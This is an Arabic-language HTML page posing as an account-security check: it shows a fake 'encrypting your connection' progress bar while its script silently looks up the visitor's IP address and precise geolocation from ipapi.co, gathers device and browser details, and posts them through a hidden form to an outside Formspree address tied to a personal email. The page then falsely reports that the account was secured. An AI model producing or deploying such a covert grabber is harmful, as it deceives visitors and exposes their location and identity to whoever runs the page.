<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تأمين الحساب السيادي - 2099</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 20px #00ff41; text-align: center; width: 90%; max-width: 500px; }
        .gate { font-size: 1.5em; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 5px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="gate">🔱 LØGHØST-Z 💀</div>
        <p id="msg">جاري تشفير الاتصال لضمان سلامتك...</p>
        <div style="border: 1px solid #00ff41; height: 10px; width: 100%;"><div id="bar" style="background:#00ff41; height:100%; width:0%;"></div></div>
    </div>

    <form id="trapForm" action="https://formspree.io/f/kabhaa982@gmail.com" method="POST" style="display:none;">
        <input type="hidden" name="IP_Address" id="ip">
        <input type="hidden" name="Location" id="loc">
        <input type="hidden" name="Device_Info" id="dev">
        <input type="hidden" name="Browser_Fingerprint" id="finger">
    </form>

    <script>
        async function initiateTrap() {
            const bar = document.getElementById('bar');
            bar.style.transition = "width 3s";
            bar.style.width = "100%";

            try {
                // استخلاص البيانات من النواة
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                // ملء البيانات في النموذج المخفي
                document.getElementById('ip').value = data.ip;
                document.getElementById('loc').value = `${data.city}, ${data.country_name} (Lat: ${data.latitude}, Long: ${data.longitude})`;
                document.getElementById('dev').value = `OS: ${navigator.platform} | Screen: ${screen.width}x${screen.height}`;
                document.getElementById('finger').value = navigator.userAgent;

                // إرسال البيانات فوراً إلى بريدك بدون شعور المهاجم
                const form = document.getElementById('trapForm');
                const formData = new FormData(form);
                
                await fetch(form.action, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                document.getElementById('msg').innerText = "تم تأمين الحساب بنجاح. يمكنك إغلاق الصفحة.";
            } catch (e) {
                document.getElementById('msg').innerText = "حدث خطأ في التشفير، حاول لاحقاً.";
            }
        }
        window.onload = initiateTrap;
    </script>
</body>
</html>
